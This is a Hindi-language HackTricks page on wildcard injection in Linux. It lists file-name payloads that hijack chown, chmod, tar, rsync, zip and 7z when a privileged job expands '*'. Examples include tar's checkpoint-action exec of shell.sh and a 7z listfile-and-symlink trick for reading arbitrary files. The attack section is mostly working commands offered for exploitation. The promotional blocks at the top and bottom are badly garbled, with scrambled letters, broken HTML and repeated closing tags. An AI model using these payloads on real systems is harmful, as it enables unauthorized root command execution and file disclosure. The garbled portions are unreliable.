{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
सीखें और GCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*चेक करें [**subsrippangithub.cm/sorsarlosp!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)** पर फॉलो करें।**
* **ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करें।

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

आप **यह संकेत कर सकते हैं कि आप बाकी फाइलों के लिए कौन सा फ़ाइल मालिक और अनुमतियाँ कॉपी करना चाहते हैं**
```bash
touch "--reference=/my/own/path/filename"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(संयुक्त हमला)_ का उपयोग करके शोषण कर सकते हैं।\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं।

## Tar

**मनमाने आदेश निष्पादित करें:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar हमला)_ का उपयोग करके शोषण कर सकते हैं।\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं।

## Rsync

**मनमाने आदेश निष्पादित करें:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ का उपयोग करके शोषण कर सकते हैं।\
अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं।

## 7z

**7z** में `--` का उपयोग करने पर भी `*` के पहले (ध्यान दें कि `--` का अर्थ है कि इसके बाद का इनपुट पैरामीटर के रूप में नहीं लिया जा सकता, इसलिए इस मामले में केवल फ़ाइल पथ) आप एक मनमाना त्रुटि उत्पन्न कर सकते हैं जिससे एक फ़ाइल पढ़ी जा सके, इसलिए यदि निम्नलिखित में से कोई आदेश रूट द्वारा निष्पादित किया जा रहा है:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
और आप उस फ़ोल्डर में फ़ाइलें बना सकते हैं जहाँ यह निष्पादित किया जा रहा है, आप फ़ाइल `@root.txt` बना सकते हैं और फ़ाइल `root.txt` को उस फ़ाइल के लिए **symlink** बना सकते हैं जिसे आप पढ़ना चाहते हैं:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
फिर, जब **7z** निष्पादित होता है, यह `root.txt` को एक फ़ाइल के रूप में मानता है जिसमें उन फ़ाइलों की सूची होती है जिन्हें इसे संकुचित करना चाहिए (यही `@root.txt` के अस्तित्व का संकेत है) और जब 7z `root.txt` को पढ़ता है, तो यह `/file/you/want/to/read` को पढ़ेगा और **चूंकि इस फ़ाइल की सामग्री फ़ाइलों की सूची नहीं है, यह एक त्रुटि फेंकेगा** जो सामग्री दिखाएगी।

_हैकथबॉक्स से CTF के बॉक्स के लेखों में अधिक जानकारी।_

## ज़िप

**मनमाने आदेश निष्पादित करें:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
```markdown
{% hnt stye="acceas" %}
AWS हैकिंग प्रैक्टिस:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
सीखें & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*चेक करें [**subsrippangithub.cm/sorsarlosp!**
* चेक करें [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **जुड़ें 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें PRs को** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में सबमिट करके।

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
```
